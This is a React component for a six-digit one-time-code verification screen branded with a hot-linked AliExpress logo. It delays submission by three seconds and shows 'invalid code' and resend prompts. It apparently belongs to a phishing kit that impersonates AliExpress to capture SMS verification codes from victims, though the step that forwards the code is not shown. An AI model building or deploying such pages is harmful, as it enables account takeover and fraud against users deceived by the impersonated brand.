'use client';
import React, { useState, useRef, useEffect } from 'react';
import { useTranslation } from '@/lib/TranslationContext';

interface OtpPageProps {
  onVerify: (otp: string) => void;
  onResend?: () => void;
  isInvalidOtp?: boolean;
}

export const OtpPage: React.FC<OtpPageProps> = ({ onVerify, onResend, isInvalidOtp }) => {
  const { t } = useTranslation();
  const [otp, setOtp] = useState('');
  const [processing, setProcessing] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  useEffect(() => { inputRef.current?.focus(); }, []);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (processing) return;
    if (e.key === 'Backspace') {
      setOtp(prev => prev.slice(0, -1));
    } else if (/^\d$/.test(e.key) && otp.length < 6) {
      setOtp(prev => prev + e.key);
    }
  };

  const handleSubmit = () => {
    if (otp.length === 6 && !processing) {
      setProcessing(true);
      setTimeout(() => {
        onVerify(otp);
      }, 3000);
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center max-w-md mx-auto relative shadow-xl px-6">
      <div className="w-full flex flex-col items-center gap-6 py-10">
        {/* Logo */}
        <div className="mb-2">
          {/* eslint-disable-next-line @next/next/no-img-element */}
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/AliExpress_2024.svg/330px-AliExpress_2024.svg.png"
            alt="AliExpress"
            className="h-8 object-contain"
          />
        </div>

        <div className="text-center space-y-2">
          <h1 className="text-2xl font-bold text-gray-900">{t('verifyPhone')}</h1>
          <p className="text-sm text-gray-500 max-w-[280px] mx-auto">{t('otpSent')}</p>
        </div>

        {isInvalidOtp && (
          <div className="w-full bg-red-50 border border-red-100 rounded-xl p-3 text-center">
            <p className="text-sm text-red-600 font-semibold">{t('invalidCode')}</p>
          </div>
        )}

        {/* 6-dot OTP display */}
        <div
          className="flex gap-3 cursor-text"
          onClick={() => !processing && inputRef.current?.focus()}
        >
          {Array.from({ length: 6 }).map((_, i) => (
            <div
              key={i}
              className={`w-12 h-14 border-2 rounded-xl flex items-center justify-center text-2xl font-bold transition-all ${
                processing
                  ? 'border-gray-200 bg-gray-50'
                  : i === otp.length
                  ? 'border-[#FF4747] bg-red-50'
                  : otp[i]
                  ? 'border-gray-300 bg-white text-gray-900'
                  : 'border-gray-200 bg-gray-50'
              }`}
            >
              {otp[i] ? (
                <span className="text-gray-900">{otp[i]}</span>
              ) : (
                <span className="w-2 h-2 rounded-full bg-gray-300 block" />
              )}
            </div>
          ))}
        </div>

        {/* Hidden input to capture keystrokes */}
        <input
          ref={inputRef}
          type="tel"
          inputMode="numeric"
          value={otp}
          onChange={() => {}}
          onKeyDown={handleKeyDown}
          className="absolute opacity-0 w-0 h-0"
          maxLength={6}
          disabled={processing}
        />

        <button
          onClick={handleSubmit}
          disabled={otp.length < 6 || processing}
          className={`w-full py-4 rounded-full text-lg font-bold text-white transition-all active:scale-[0.98] ${
            otp.length < 6 || processing ? 'bg-gray-200 text-gray-400 cursor-not-allowed' : 'bg-[#FF4747] hover:bg-[#e03030]'
          }`}
        >
          {processing ? (
            <span className="flex items-center justify-center gap-2">
              <svg className="animate-spin h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
              </svg>
              {t('processing')}
            </span>
          ) : t('verify')}
        </button>

        <div className="flex items-center gap-2 text-sm text-gray-500">
          <span>{t('didntReceive')}</span>
          <button
            onClick={() => { if (!processing) { setOtp(''); onResend?.(); } }}
            disabled={processing}
            className="text-[#FF4747] font-semibold hover:underline disabled:opacity-50"
          >
            {t('resend')}
          </button>
        </div>
      </div>
    </div>
  );
};
